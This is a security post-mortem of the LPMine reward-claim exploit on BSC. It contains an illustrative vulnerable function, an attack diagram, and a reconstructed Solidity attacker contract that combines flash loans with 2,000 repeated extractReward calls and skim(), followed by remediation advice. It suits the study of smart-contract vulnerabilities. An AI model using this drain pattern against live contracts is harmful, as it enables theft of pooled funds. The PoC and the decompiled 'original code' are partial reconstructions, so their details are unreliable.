# LPMine — Unlimited Reward Repeated Claim Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-11 |
| **Protocol** | LPMine |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$24,000 USDT |
| **Attacker** | [Unidentified](https://bscscan.com/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://bscscan.com/tx/0x0000000000000000000000000000000000000000000000000000000000000000) |
| **Vulnerable Contract** | [0x6BBeF6DF...](https://bscscan.com/address/0x6BBeF6DF8db12667aE88519090984e4F871e5feb) |
| **Root Cause** | `extractReward()` calculates rewards based on pair reserves without updating the timestamp, allowing repeated claims |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/LPMine_exp.sol) |

---

## 1. Vulnerability Overview

The `extractReward()` function in the LPMine contract did not update the timestamp or last claim checkpoint after distributing rewards. As a result, the attacker combined a DODO flash loan with a PancakeSwap V3 flash loan to add liquidity, then repeatedly called `extractReward(1)` 2,000 times to collect the same reward each iteration. The `skim()` function was additionally used to extract surplus tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no state update after reward payout
function extractReward(uint256 tokenId) external {
    uint256 reward = calculateReward(tokenId); // calculated based on pair reserves
    // ❌ Claim timestamp not updated → same reward recalculated on next call
    // lastClaimTime[tokenId] = block.timestamp; ← missing
    IERC20(rewardToken).transfer(msg.sender, reward);
}

function calculateReward(uint256 tokenId) internal view returns (uint256) {
    // Calculated solely from current pair reserves — claim history not reflected
    (uint112 reserve0, uint112 reserve1,) = IPair(pair).getReserves();
    return (reserve0 + reserve1) * rewardRate;
}

// ✅ Safe code: state updated after claim
function extractReward(uint256 tokenId) external nonReentrant {
    uint256 reward = calculateReward(tokenId);
    lastClaimTime[tokenId] = block.timestamp;   // update claim timestamp
    lastClaimBlock[tokenId] = block.number;     // update block number as well
    IERC20(rewardToken).transfer(msg.sender, reward);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: LPMine_decompiled.sol
contract LPMine {
    function extractReward(uint256 a) external {  // ❌ vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO Flash Loan: obtain 1,000 ZF tokens
  │
  ├─→ [2] Swap half of ZF → USDT
  │
  ├─→ [3] Add liquidity via partakeAddLp(tokenId=2)
  │         └─ Create ZF/USDT LP pair
  │
  ├─→ [4] PancakeSwap V3 Flash Loan: obtain 5,000,000 USDT
  │         └─ Artificially inflate pool reserves
  │
  ├─→ [5] Call extractReward(1) × 2,000 times in a loop
  │         └─ Reward paid out based on pair reserves each time
  │            Claim history not updated → same reward collected repeatedly
  │
  ├─→ [6] Call skim() to extract surplus tokens
  │
  ├─→ [7] Swap accumulated tokens → USDT
  │
  ├─→ [8] Repay both flash loans
  │
  └─→ [9] ~$24,000 USDT profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not obtained — reconstructed from summary

contract LPMineAttacker {
    address constant ZF = 0x259A9FB74d6A81eE9b3a3D4EC986F08fbb42121A;
    address constant LPMINE = 0x6BBeF6DF8db12667aE88519090984e4F871e5feb;
    address constant PAIR = 0xBE2F4D0C39416C7C4157eBFdccB65cc2FF5fb2C4;

    function attack() external {
        // [1] DODO Flash Loan: 1,000 ZF
        IDODO(dodoPool).flashLoan(1000e18, 0, address(this), "");
    }

    function DVMFlashLoanCall(...) external {
        // [2] Swap half of ZF → USDT
        _swap(ZF, USDT, 500e18);

        // [3] Add liquidity
        ILPMine(LPMINE).partakeAddLp(2, 500e18, 500e6);

        // [4] PancakeSwap V3 Flash Loan: 5,000,000 USDT
        IPancakeV3Pool(pcsPool).flash(
            address(this), 0, 5_000_000e6, ""
        );

        // Repay flash loan (DODO)
        IERC20(ZF).transfer(dodoPool, 1000e18 + fee);
    }

    function pancakeV3FlashCallback(...) external {
        // [5] Call extractReward 2,000 times — core vulnerability exploit
        for (uint256 i = 0; i < 2000; i++) {
            ILPMine(LPMINE).extractReward(1);
        }

        // [6] Extract surplus tokens via skim
        IPair(PAIR).skim(address(this));

        // [7] Convert tokens → USDT
        _swapAllToUSDT();

        // Repay PancakeSwap flash loan
        IERC20(USDT).transfer(pcsPool, 5_000_000e6 + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Unchecked Reward State (missing claim state update) |
| **CWE** | CWE-362: Race Condition / State Desynchronization |
| **Attack Vector** | External (repeated function calls + flash loans) |
| **DApp Category** | LP Mining / Liquidity Rewards |
| **Impact** | Full drainage of the reward pool |

## 6. Remediation Recommendations

1. **Immediate state update after reward claim**: `extractReward()` must update the claim timestamp and block number on every call
2. **Checks-Effects-Interactions pattern**: Perform state changes before external transfers
3. **Rate-limit repeated calls**: Restrict the number of reward claims per `tokenId` within a given time window
4. **Improved reward calculation**: Adopt a cumulative reward index (reward per share) approach instead of relying on instantaneous reserves

## 7. Lessons Learned

- The "Checks-Effects-Interactions" pattern is essential not only for preventing reentrancy but also for preventing duplicate reward claims.
- Repeating a call 2,000 times approaches the gas limit, making defense against repeated claims within a single transaction critically important.
- The `skim()` function is a legitimate AMM mechanism for extracting surplus tokens, but when combined with a vulnerable reward mechanism it causes additional losses.